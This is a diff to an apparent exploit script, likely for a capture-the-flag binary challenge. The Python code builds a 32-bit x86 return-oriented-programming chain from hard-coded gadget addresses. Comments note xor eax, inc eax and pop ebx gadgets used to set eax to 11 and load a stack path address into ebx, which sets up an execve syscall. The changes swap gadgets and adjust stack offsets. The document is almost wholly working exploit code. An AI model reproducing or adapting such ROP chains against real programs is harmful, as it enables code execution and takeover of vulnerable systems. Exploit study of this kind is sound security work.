@@ -7,7 +7,6 @@ from struct import pack
 
 p32 = lambda x: pack("<I", x)
 chain = b''
-chain += p32(0x080620f1)
 chain += p32(0x080c9d41)
 chain += p32(0x080c9d41)
 chain += p32(0x080c9d41)
@@ -27,14 +26,12 @@ chain += p32(0xbbbbbbbb)
 chain += p32(0xbbbbbbbb) # edx=eax=0
 
 
-
 '''
 0x080620f1: xor eax, eax
 0x080c9d41:
    0x080c9d41:  inc    %eax
    0x080c9d42:  ret
 '''
-chain += p32(0x080620f1)# to eax=11
 chain += p32(0x080c9d41)
 chain += p32(0x080c9d41)
 chain += p32(0x080c9d41)
@@ -49,11 +46,10 @@ chain += p32(0x080c9d41)
 
 
 '''
-0x0809e6c5: pop ebx; pop esi
+0x08069f6b pop ebx
 '''
-path_addr = pack('<I',0xfffed77c-12)
-chain+=p32(0x0809e6c5)
-chain+=path_addr
+path_addr = pack('<I',0xfffed77c-24)
+chain+=p32(0x08069f6b)
 chain+=path_addr # ebx loaded
 
 '''
